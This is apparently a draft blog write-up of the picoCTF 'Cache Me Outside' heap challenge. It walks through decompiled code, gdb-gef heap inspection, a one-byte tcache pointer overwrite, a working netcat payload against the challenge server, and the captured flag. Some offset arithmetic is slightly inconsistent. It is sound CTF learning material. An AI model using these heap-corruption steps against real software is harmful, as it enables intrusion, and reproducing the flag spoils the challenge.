---
title: "Cache Me Outside Picoctf Writeup"
date: 2023-08-06T18:26:17+02:00
draft: true
---

## Cache Me Outside PicoCTF
>While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations.

Continuing on the PWN training, this challenge exploits mallocs `tcache`, a feature it uses to re-use freed mallocs with same size. Let's take a look at it. Unfortunately we are not provided with the sourcecode, so we will have to disassemble it from the binary, but first let's run it and see what it does:

```text
You may edit one byte in the program.
Address: 100
Value: JELOU
t help you: this is a random string.
```
So apparently what it does is change a byte from the program by giving it a memory address and a Value. Interestingly enough, it printed a message that seems to be halfway (some of the characters at the beginning are missing).

Let's analyse the code to see if we can take something else. To do so, I'll be using the decompiler `ghidra`

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_a9;
  int local_a8;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *malloc1;
  FILE *flag;
  undefined8 *malloc2;
  void *local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined local_60;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag = fopen("flag.txt","r");
  fgets(local_58,0x40,flag);
  local_78 = 0x2073692073696874;
  local_70 = 0x6d6f646e61722061;
  local_68 = 0x2e676e6972747320;
  local_60 = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    malloc1 = (undefined8 *)malloc(0x80);
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = malloc1;
    }
    *malloc1 = 0x73746172676e6f43;
    malloc1[1] = 0x662072756f592021;
    malloc1[2] = 0x203a73692067616c;
    *(undefined *)(malloc1 + 3) = 0;
    strcat((char *)malloc1,local_58);
  }
  malloc2 = (undefined8 *)malloc(0x80);
  *malloc2 = 0x5420217972726f53;
  malloc2[1] = 0x276e6f7720736968;
  malloc2[2] = 0x7920706c65682074;
  *(undefined4 *)(malloc2 + 3) = 0x203a756f;
  *(undefined *)((long)malloc2 + 0x1c) = 0;
  strcat((char *)malloc2,(char *)&local_78);
  free(malloc1);
  free(malloc2);
  local_a8 = 0;
  local_a9 = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);
  *(undefined *)((long)local_a8 + (long)local_a0) = local_a9;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
So with that we can see things better! We see the program creates two mallocs that, after saving some info in them, it frees both of them. Some time after, it re-allocates one with the same size as the previous ones. Acording to malloc's `tcache` it will re-use one of them.

Now that we have some info about the sourcecode, let's turn on our debugger and see what's going on!

### Debugging

>Since this challenge is more about memory and heap, I'll be using **gdb-gef** extension


First thing we want to do is set a breakpoint on the main function, so we have all the info at startup of the execution. I will also set breakpoints at function puts so I have the info before and after the change in memory value:

```shell
gdb-gef ./heapedit

Reading symbols from ./heapedit...
(No debugging symbols found in ./heapedit)
Error while writing index for `/home/l0w3/Desktop/training/picoCTF/cachemeoutside/heapedit': No debugging symbols
GEF for linux ready, type `gef' to start, `gef config' to configure
89 commands loaded and 5 functions added for GDB 13.2 in 0.00ms using Python engine 3.11
gef➤  b main
Breakpoint 1 at 0x40080b
gef➤  b puts
Breakpoint 2 at 0x400690
gef➤  r
```

When run, `gef` will show some info about memory and pointers, but we won't look that much for this CTF. We are interested though in the mem usage at heap, so let's analyse it.

```shell
gef➤  c
Continuing.

Breakpoint 2, 0x00007ffff7880a30 in puts () from ./libc.so.6

===SNIP===

gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 9e 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602490     74 65 73 74 66 6c 61 67 7b 31 32 33 7d 0a 00 00    testflag{123}...]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
With the command `heap chunks` we can see all the chunks allocated on the heap. Note how the part that allocates the string that stores the flag and then it's freed. That one is interesting, as we will see later on.
`Interesting memory addr: 0x6034a0`

Now, let's get the pointer to the `tcache`, as we will need to change it to point to the memory address above.

```shell
gef➤  heap bins tcache
─────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────
Tcachebins[idx=7, size=0x90, count=1] ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```

Ok, so the mem addr of that freed chunk is `0x603800`. We need now the address of the pointer, which we can find with the command `search-pattern`

```shell
gef➤  search-pattern 0x603800
[+] Searching '\x00\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x00\x38\x60[...]" 
  0x603890 - 0x60389c  →   "\x00\x38\x60[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdc80 - 0x7fffffffdc8c  →   "\x00\x38\x60[...]" 
```
The one that is interesting for us is the `0x60208` since it's the first freed chunk (the one containing our flag). Now we just need to change the pointers.

Here it comes the trick:

### Exploiting 
```c
*(undefined *)((long)local_a8 + (long)local_a0) = local_a9;
```
`local_a8` stores the value we pass to the address promt, and it's getting added to a variable called `local_a0`, so it essentially stores our data `local_a8`positions ahead of `local_a0`. Thus, if we want to move to the mem area where the flag malloc was stored and cached, we simply have to know how many positions away from `local_a0` we are to the flag mem addr.

`0x6034a0 - 0x602088 = 0x1418 -> -5144` positions away from `local_a0`.

With that distance, let's try to gat it right. I'll be using the following payload:
`{ echo "-5144"; printf "\x00" } | ./heapedit` 

```shell
{ echo "-5144"; printf "\x00" } | ./heapedit

You may edit one byte in the program.
Address: Value: lag is: testflag{123}
```
Great! We see our testflag, so let's try it out on the server

```shell
{ echo "-5144"; printf "\x00" } | nc mercury.picoctf.net 8054
You may edit one byte in the program.
Address: Value: lag is: picoCTF{5c9838eff837a883a30c38001280f07d}
```
And whit this, challenge solved!